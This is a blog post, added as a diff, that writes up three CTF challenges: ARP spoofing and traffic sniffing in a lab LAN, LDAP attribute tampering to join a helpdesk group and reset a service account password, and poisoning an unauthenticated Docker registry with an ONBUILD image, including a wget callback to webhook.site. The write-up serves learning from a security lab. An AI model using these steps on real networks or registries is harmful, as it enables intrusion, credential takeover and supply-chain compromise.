@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>NNS Devsecoops challenges writeups</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>NNS Devsecoops challenges writeups | grep-user blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="NNS Devsecoops challenges writeups" />
+<meta name="author" content="grep-user" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hiding in your WiFi" />
+<meta property="og:description" content="Hiding in your WiFi" />
+<link rel="canonical" href="http://localhost:8001/NNS-CTF-Devsecoops-Writeup" />
+<meta property="og:url" content="http://localhost:8001/NNS-CTF-Devsecoops-Writeup" />
+<meta property="og:site_name" content="grep-user blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-09-14T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="NNS Devsecoops challenges writeups" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"grep-user","url":"https://grep-user.github.io"},"dateModified":"2026-09-14T00:00:00+05:30","datePublished":"2026-09-14T00:00:00+05:30","description":"Hiding in your WiFi","headline":"NNS Devsecoops challenges writeups","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8001/NNS-CTF-Devsecoops-Writeup"},"url":"http://localhost:8001/NNS-CTF-Devsecoops-Writeup"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>grep-user@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>NNS Devsecoops challenges writeups</h2>
+  <time datetime="2026-09-14T00:00:00+05:30" class="by-line">14 Sep 2026</time>
+  <h3 id="hiding-in-your-wifi">Hiding in your WiFi</h3>
+
+<h4 id="description">Description</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I'm on your network. There is a client at 10.10.10.20 that keeps fetching something from the web server at 10.10.10.10, and the server only talks to the client.
+
+You are 10.10.10.66. You have arpspoof and tcpdump.
+
+</code></pre></div></div>
+
+<h4 id="analysis">Analysis</h4>
+
+<p>The challenge creates an instance with arpspoof and tcpdump. After connecting to remote instace using ncat <code class="language-plaintext highlighter-rouge">ncat --ssl hiding-in-your-wifi-25e0d6949410.chall.nnsc.tf 1337</code>, we can find file <strong>entrypoint.sh</strong> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="nb">set</span> <span class="nt">-eu</span>
+
+<span class="nv">role</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$role</span><span class="s2">"</span> <span class="o">=</span> shell <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/home/player
+    <span class="nb">exec </span>capsh <span class="nt">--keep</span><span class="o">=</span>1 <span class="nt">--user</span><span class="o">=</span>player <span class="se">\</span>
+        <span class="nt">--inh</span><span class="o">=</span>cap_net_raw,cap_net_admin <span class="nt">--addamb</span><span class="o">=</span>cap_net_raw,cap_net_admin <span class="nt">--</span> <span class="nt">-i</span>
+<span class="k">fi
+
+</span><span class="nv">POD_IP</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">POD_IP</span><span class="k">:-</span><span class="si">$(</span><span class="nb">hostname</span> <span class="nt">-i</span><span class="si">)</span><span class="k">}</span><span class="s2">"</span>
+
+<span class="nv">peers</span><span class="o">=</span><span class="s2">""</span>
+<span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> name addr hwaddr<span class="p">;</span> <span class="k">do
+    if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$role</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nv">ip</span><span class="o">=</span><span class="nv">$addr</span> <span class="nv">mac</span><span class="o">=</span><span class="nv">$hwaddr</span>
+        <span class="k">continue
+    fi
+    until </span><span class="nv">peer_ip</span><span class="o">=</span><span class="si">$(</span>getent <span class="nt">-s</span> files hosts <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$peer_ip</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">sleep </span>1
+    <span class="k">done
+    </span><span class="nv">peers</span><span class="o">=</span><span class="s2">"</span><span class="nv">$peers$hwaddr</span><span class="s2"> </span><span class="nv">$peer_ip</span><span class="s2">
+"</span>
+<span class="k">done</span> <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+server   10.10.10.10 02:00:00:00:00:10
+victim   10.10.10.20 02:00:00:00:00:20
+attacker 10.10.10.66 02:00:00:00:00:66
+</span><span class="no">EOF
+
+</span>ip <span class="nb">link </span>add vxlan0 <span class="nb">type </span>vxlan <span class="nb">id </span>42 dstport 4789 ttl 64 nolearning <span class="se">\</span>
+    dev eth0 <span class="nb">local</span> <span class="s2">"</span><span class="nv">$POD_IP</span><span class="s2">"</span>
+ip netns add lan
+ip <span class="nb">link set </span>vxlan0 netns lan
+ip <span class="nt">-n</span> lan <span class="nb">link set </span>vxlan0 name eth0 address <span class="s2">"</span><span class="nv">$mac</span><span class="s2">"</span>
+ip <span class="nt">-n</span> lan addr add <span class="s2">"</span><span class="nv">$ip</span><span class="s2">/24"</span> dev eth0
+ip <span class="nt">-n</span> lan <span class="nb">link set </span>eth0 up
+ip <span class="nt">-n</span> lan <span class="nb">link set </span>lo up
+
+<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$peers</span><span class="s2">"</span> | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> hwaddr peer_ip<span class="p">;</span> <span class="k">do
+    if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$hwaddr</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then continue</span><span class="p">;</span> <span class="k">fi
+    </span>ip netns <span class="nb">exec </span>lan bridge fdb replace <span class="s2">"</span><span class="nv">$hwaddr</span><span class="s2">"</span> dev eth0 dst <span class="s2">"</span><span class="nv">$peer_ip</span><span class="s2">"</span>
+    ip netns <span class="nb">exec </span>lan bridge fdb append 00:00:00:00:00:00 dev eth0 dst <span class="s2">"</span><span class="nv">$peer_ip</span><span class="s2">"</span>
+<span class="k">done
+
+case</span> <span class="s2">"</span><span class="nv">$role</span><span class="s2">"</span> <span class="k">in
+    </span>server<span class="p">)</span>
+        <span class="nb">exec </span>ip netns <span class="nb">exec </span>lan nginx <span class="nt">-g</span> <span class="s1">'daemon off;'</span>
+        <span class="p">;;</span>
+    victim<span class="p">)</span>
+        <span class="nb">exec </span>ip netns <span class="nb">exec </span>lan sh <span class="nt">-c</span> <span class="s1">'while :; do
+            curl -s -o /dev/null http://10.10.10.10/flag.txt
+            sleep 5
+        done'</span>
+        <span class="p">;;</span>
+    attacker<span class="p">)</span>
+        ip netns <span class="nb">exec </span>lan sh <span class="nt">-c</span> <span class="s1">'
+            mount -o remount,rw,bind /proc/sys
+            echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+            echo 0 &gt; /proc/sys/net/ipv4/conf/all/send_redirects'</span>
+        <span class="nb">exec </span>socat TCP-LISTEN:1337,fork,reuseaddr,max-children<span class="o">=</span>8 <span class="se">\</span>
+            EXEC:<span class="s1">'ip netns exec lan /entrypoint.sh shell'</span>,pty,stderr,setsid,sigint,sane
+        <span class="p">;;</span>
+<span class="k">esac</span>
+</code></pre></div></div>
+
+<p>and the machine’s /etc/hosts file</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.0.135.133	attacker-78b499fdff-qrv6x
+
+<span class="c"># Entries added by HostAliases.</span>
+172.20.146.162	server
+172.20.114.96	victim
+172.20.162.78	attacker
+</code></pre></div></div>
+
+<p>Analysis from the script</p>
+
+<ol>
+  <li>Three distinct ips to simulate attacker, victim and server within <strong>lan</strong> namespace.</li>
+  <li>A VXLAN link is created and attached to <strong>lan</strong> namespace with mac address learning disabled.</li>
+  <li>FDB forwarding through VTEP - adds mac addr <code class="language-plaintext highlighter-rouge">02:00:00:00:00:20</code> routing to 172.20.114.96 and <code class="language-plaintext highlighter-rouge">02:00:00:00:00:10</code> to 172.20.146.162 and also adds a wildcard mac address routes to those ips. Below command output describes the bridge created.</li>
+  <li>finally the commands to run for specific roles
+    <ul>
+      <li>server: it starts the server is lan namepsace</li>
+      <li>victim: curls server for every 5 seconds using lan namespace address[10.10.10.10] and not the actual ip.</li>
+      <li>attacker: starts a cap shell from the beginning of the script with ip forwarding enabled which is necessary for arpsoof to work.</li>
+    </ul>
+  </li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>player@attacker-78b499fdff-qrv6x:/bin$ bridge fdb show
+bridge fdb show
+02:00:00:00:00:20 dev eth0 dst 172.20.114.96 link-netnsid 0 self permanent
+00:00:00:00:00:00 dev eth0 dst 172.20.146.162 link-netnsid 0 self permanent
+00:00:00:00:00:00 dev eth0 dst 172.20.114.96 link-netnsid 0 self permanent
+02:00:00:00:00:10 dev eth0 dst 172.20.146.162 link-netnsid 0 self permanent
+</code></pre></div></div>
+
+<h4 id="solution">Solution</h4>
+
+<p>These details are analyzed after the CTF ended to understand how well the lab was created. During CTF, it is clear that attacker should spoof</p>
+
+<ul>
+  <li>server that he is victim <code class="language-plaintext highlighter-rouge">arpspoof -i eth0 -t 10.10.10.20 10.10.10.10</code>.</li>
+  <li>victim that attacker is server <code class="language-plaintext highlighter-rouge">arpspoof -i eth0 -t 10.10.10.10 10.10.10.20</code>.</li>
+</ul>
+
+<p>since ip forwarding is enabled traffic flows from victim to attacker and from attacker to server without any modification. Now we can dump the tcp traffic using tcpdump.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-i</span> eth0 <span class="nt">-w</span> /tmp/a.pcap
+</code></pre></div></div>
+
+<p>after few seconds we can stop the capture and read the pcap file and we can find plaintext traffic data in the dump</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-r</span> /tmp/a.pcap <span class="nt">-A</span> <span class="s1">'tcp
+</span></code></pre></div></div>
+
+<p><img src="../assets/2026/nns/1.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=70%" /></p>
+
+<h3 id="self-service">Self-Service</h3>
+
+<h4 id="description-1">Description</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You are our brand new contractor at NNS corp! You have been given a user account: ereid:Summer2026. Welcome on board!
+
+SSH is exposed over TLS:
+ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p' ereid@HOST -p 1337
+</code></pre></div></div>
+
+<h4 id="analysis-1">Analysis</h4>
+
+<p>After connecting with given password for user ereid in SSH, we are inside windows powershell. Only few binaries are present and most of them are LDAP  tools. From the initial analysis it is clear we have to exploit this LDAP user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-D</span> <span class="s1">'uid=ereid,ou=contractors,dc=corp,dc=nns'</span> <span class="nt">-W</span> <span class="s1">'(objectClass=*)'</span>
+
+</code></pre></div></div>
+
+<p>This query displays all objectclass and attributes associated with the object. these are some important findings</p>
+
+<ul>
+  <li>dn: uid=ops,ou=staff,dc=corp,dc=nns : looks like service account as this is mentioned in GECOS field <code class="language-plaintext highlighter-rouge">Operations service account (backup/restore on srv2)</code></li>
+  <li>ereid user is member of <strong>vpn-users</strong> and  <strong>onboarding-agents</strong> groups.</li>
+</ul>
+
+<h4 id="solution-1">Solution</h4>
+
+<p>Initially I was stuck here and couldn’t proceed furhter, but once the CTF ends the creator shared the way to solve this in discord. the solution is to modify ldap of user ereid to staff.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'dn: uid=ereid,ou=staff,dc=corp,dc=nns\nchangetype: modrdn\nnewrdn: uid=ereid\nnewsuperior: ou=contractors,dc=corp,dc=nns'</span> <span class="o">&gt;</span>move-ereid.ldif 
+
+ldapmodify <span class="nt">-x</span> <span class="nt">-D</span> <span class="s1">'uid=ereid,ou=contractors,dc=corp,dc=nns'</span> <span class="nt">-W</span> <span class="nt">-f</span> move-ereid.ldif
+</code></pre></div></div>
+
+<ul>
+  <li>After modifying OU of the user, we can inspect LDAP attributes again to find out that description of <strong>helpdesk</strong> group</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-D</span> <span class="s1">'uid=ereid,ou=staff,dc=corp,dc=nns'</span> <span class="nt">-W</span> <span class="s1">'(cn=helpdesk)'</span>
+...
+description: First-line IT support. Members are provisioned automatically from
+  HR attributes.
+...
+</code></pre></div></div>
+
+<ul>
+  <li>So the next step is to modify specific attributes to join helpdesk group. All the helpdesk user has same title in their attributes, so changing it for ereid user.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'%s\n'</span> <span class="s1">'dn: uid=ereid,ou=staff,dc=corp,dc=nns'</span> <span class="s1">'changetype: modify'</span> <span class="s1">'replace: title'</span> <span class="s1">'title: Platform Engineer'</span> <span class="o">&gt;</span> title.ldif
+ldapmodify <span class="nt">-x</span> <span class="nt">-D</span> <span class="s1">'uid=ereid,ou=staff,dc=corp,dc=nns'</span> <span class="nt">-W</span> <span class="nt">-f</span> title.ldif
+</code></pre></div></div>
+
+<ul>
+  <li>Once the attribute is changed, we are automatically added to helpdesk group. we can change ops service account password.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'%s\n'</span> <span class="s1">'dn: uid=ops,ou=staff,dc=corp,dc=nns'</span> <span class="s1">'changetype: modify'</span> <span class="s1">'replace: userPassword'</span> <span class="s1">'userPassword: Summer2026'</span> <span class="o">&gt;</span> password.ldif
+ldapmodify <span class="nt">-x</span> <span class="nt">-D</span> <span class="s1">'uid=ereid,ou=staff,dc=corp,dc=nns'</span> <span class="nt">-W</span> <span class="nt">-f</span> password.ldif
+</code></pre></div></div>
+
+<ul>
+  <li>After new password is set we can ssh into srv2 server.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/hosts
+...
+172.20.73.162	srv2
+
+ssh ops@srv2
+ops@srv2-586969c5bb-6hqsx:~<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+ops@srv2-586969c5bb-6hqsx:~<span class="nv">$ </span><span class="nb">cat </span>flag.txt 
+NNS<span class="o">{</span>a_J0B_71t13_is_n07_aN_aCc35s_c0n7R01_b0UNDarY_4nD_4pp4r3n71y_tH3Re_4R3_4ctu4l_oR65_tH47_Do_stUpid_sH17_1ike_this<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="../assets/2026/nns/2.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=70%" /></p>
+
+<h3 id="the-builder">The Builder</h3>
+
+<h4 id="description-2">Description</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>People have been complaining about how hard it is to create container images. We took this opportunity to build a SaaS to build ready-to-deploy sites!
+</code></pre></div></div>
+
+<h4 id="analysis-2">Analysis</h4>
+
+<p>We are given web server and docker image registry instance. From the website, we can add HTML pages and we will get docker image which we can pull and build container from it.</p>
+
+<p>The docker image step involves,</p>
+
+<ul>
+  <li>Base debian image named as theme is pulled.</li>
+  <li><a href="https://docs.docker.com/build/building/secrets/#secret-mounts">secret mount</a> is mounted from machine where the image is created and the content is copied to /flag.txt in the theme image.</li>
+  <li>Page image is pulled from its local registry as content0 which contains our HTML site contents.</li>
+  <li>And finally a slim nginx container is pulled from chainguard as site. The theme.css and the saved html files are added inside this image and pushed to challenge’s docker image registry.</li>
+</ul>
+
+<p><img src="../assets/2026/nns/3.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=70%" /></p>
+
+<p>In the intial analysis I misunderstood that the nginx container image we are provided may contain the flag. But I had challenges debugging the nginx image since it is distroless or more aptly without any shell builtins to debug. Later I used the technique explained (here)[https://iximiuz.com/en/posts/docker-debug-slim-containers/] to export the container and inspect its content. The blog also explains other neat techniques to debug slim containers by mounting utilites with pid namespace inside container 🤯. But as always I wasted lot of time inspecting the nginx container without any progress.</p>
+
+<h4 id="solution-2">Solution</h4>
+
+<p>Since the docker registry provided is unauthenticated, we can <strong>pull</strong> or <strong>push</strong> any images. Only the pages and sites created are pushed into the registry but not the theme image where the secret is copied.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://the-builder-registry-02a28d24aee1.chall.nnsc.tf/v2/_catalog                                                          
+<span class="o">{</span><span class="s2">"repositories"</span>:[<span class="s2">"pages"</span>,<span class="s2">"sites/10631f2c50fb"</span>,<span class="s2">"sites/18c5d3a09668"</span>,<span class="s2">"sites/c39782909640"</span>,<span class="s2">"sites/db9da8cbf2b9"</span><span class="o">]}</span>
+
+curl https://the-builder-registry-02a28d24aee1.chall.nnsc.tf/v2/pages/tags/list
+<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"pages"</span>,<span class="s2">"tags"</span>:[<span class="s2">"20446622b33c"</span>,<span class="s2">"9c0bf6ca38e8"</span><span class="o">]}</span>
+</code></pre></div></div>
+
+<p>Since the same page images is used whenever the same content is used, we can push a malicious image to docker registry with same image tag. So I created a simple dockerfile.</p>
+
+<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> alpine</span>
+
+<span class="k">RUN </span>wget https://webhook.site/
+</code></pre></div></div>
+
+<p>creating new image and tagging it with same id as remote image id and pushing it to the registry.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker build <span class="nt">-t</span> <span class="nb">test</span> <span class="nb">.</span>
+<span class="nb">sudo </span>docker tag <span class="nb">test</span>:latest the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8
+<span class="nb">sudo </span>docker push the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8
+</code></pre></div></div>
+
+<p>Whenever the same page is used we will get callback in our webhook site. Now this made me fall into another rabbit hole on how to achieve code execution[the code executed will be inside the alpine container we specified] or read contents of flag. But the solution is simple, docker has special instruction (ONBUILD)[https://docs.docker.com/reference/dockerfile/#onbuild] which executes instruction when building the next image and it supports COPY instruction. The destination is specified as <em>page</em> as this is the only content that will copied in final step to the nginx container.</p>
+
+<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> alpine</span>
+
+<span class="k">ONBUILD</span><span class="w"> </span><span class="k">COPY</span><span class="s"> --from=theme /flag.txt /page</span>
+</code></pre></div></div>
+
+<p>Pushing, building, pulling and inspecting the poisoned image.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker build <span class="nt">-t</span> <span class="nb">test</span> <span class="nb">.</span>
+
+<span class="nb">sudo </span>docker tag <span class="nb">test</span>:latest the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8
+
+<span class="nb">sudo </span>docker push the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8
+
+<span class="c"># after creating new image we can pull the poisoned image from registry</span>
+<span class="nb">sudo </span>docker pull the-builder-registry-02a28d24aee1.chall.nnsc.tf:443/sites/10631f2c50fb:latest
+
+<span class="c"># inspecting by creating container from image</span>
+<span class="nb">sudo </span>docker create <span class="nt">--name</span> debugger 587bf75a3e61
+
+<span class="c"># export into contents folder</span>
+<span class="nb">sudo </span>docker <span class="nb">export </span>debugger | <span class="nb">tar</span> <span class="nt">-xC</span> contents
+/contents/usr/share/nginx/html <span class="nv">$ </span><span class="nb">cat </span>ind.html
+NNS<span class="o">{</span>WH0_tHought_th47_thi5_7R1ggeR_wa5_4_g00d_iDea??_w3ll_4nyw4ys_y0u_did_17<span class="o">}</span>
+</code></pre></div></div>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>grep-user</b>
+    </span>
+    
+    <span>© 2026</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
